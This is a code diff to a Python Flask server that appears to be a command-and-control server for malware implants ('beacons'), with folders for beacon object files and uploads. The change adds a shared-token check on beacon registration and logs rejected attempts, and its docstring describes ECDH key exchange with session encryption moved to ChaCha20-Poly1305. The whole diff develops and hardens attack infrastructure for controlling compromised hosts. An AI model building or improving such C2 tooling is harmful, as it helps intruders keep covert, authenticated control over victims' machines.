@@ -21,6 +21,8 @@ command_queue = {}
 BOF_DIR       = "bofs"
 UPLOAD_DIR    = "uploads"
 STATE_FILE    = "agents.json"
+AUTH_TOKEN    = os.environ.get("C2_AUTH_TOKEN", "")
+AUTH_HEADER   = "X-C2-Token"
 
 _print_lock     = threading.Lock()
 _current_prompt = ""
@@ -260,10 +262,18 @@ def route_register():
     Request body:  65 bytes  — beacon's X9.62 uncompressed P-256 pubkey
     Response body: 65 bytes  — server's X9.62 uncompressed P-256 pubkey
                  + 36 bytes  — agent UUID (ASCII)
-    Both sides then derive: TEA key = SHA-256(ECDH shared secret)[:16]
-    All subsequent traffic is TEA-CTR encrypted with that key.
+    If server auth is enabled via C2_AUTH_TOKEN, the beacon must supply the
+    X-C2-Token header with the registration request.
+    Both sides then derive: ChaCha20-Poly1305 key = SHA-256(ECDH shared secret)
+    All subsequent traffic is encrypted with that key.
     """
     beacon_pub_bytes = request.data
+
+    if AUTH_TOKEN:
+        token = request.headers.get(AUTH_HEADER, "")
+        if token != AUTH_TOKEN:
+            async_log(f"Bad /register auth token from {request.remote_addr}", "warn")
+            return b"forbidden", 403
 
     if len(beacon_pub_bytes) != 65 or beacon_pub_bytes[0] != 0x04:
         async_log("Bad /register — expected 65-byte X9.62 pubkey", "err")
@@ -659,6 +669,9 @@ if __name__ == "__main__":
 
     load_state()
     banner()
+
+    if AUTH_TOKEN:
+        log(f"register auth enabled  header={AUTH_HEADER}", "warn")
 
     def _flask():
         app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False, threaded=True)
